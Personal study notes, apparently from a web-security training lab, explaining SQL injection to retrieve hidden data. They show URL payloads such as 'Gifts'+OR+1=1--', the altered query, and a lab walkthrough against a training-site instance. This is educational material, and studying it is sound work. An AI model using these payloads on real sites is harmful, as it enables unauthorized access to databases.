# Retrieving hidden data

```applescript
#SELECT * FROM products WHERE category = 'Gifts' AND released = 1
https://insecure-website.com/products?category=Gifts'--

#Crucially, note that -- is a comment indicator in SQL.
#This means that the rest of the query is interpreted as a comment,


```

You can use a similar attack to cause the application to display all the products in any category, including categories that they don't know about:

`https://insecure-website.com/products?category=Gifts'+OR+1=1--` \
\
This results in the SQL query:

`SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`

The modified query returns all items where either the `category` is `Gifts`, or `1` is equal to `1`. As `1=1` is always true, the query returns all items.

<pre class="language-applescript"><code class="lang-applescript"># partical lab
<strong>> https://0aaf00120387d04d825b61c100840085.web-security-academy.net/filter?category=Pets'
</strong>
#it will shows u the parameter is vul to sql or not if u got any msg like sql syntax error 
or internal server error means that vul to sql injection
<strong>> Internal Server Error
</strong>
# find the hidden data by using equal to cmd 1=1   (OR 1=1) in url way ('+OR+1=1--)
> filter?category=Pets%27+OR+1=1--


</code></pre>
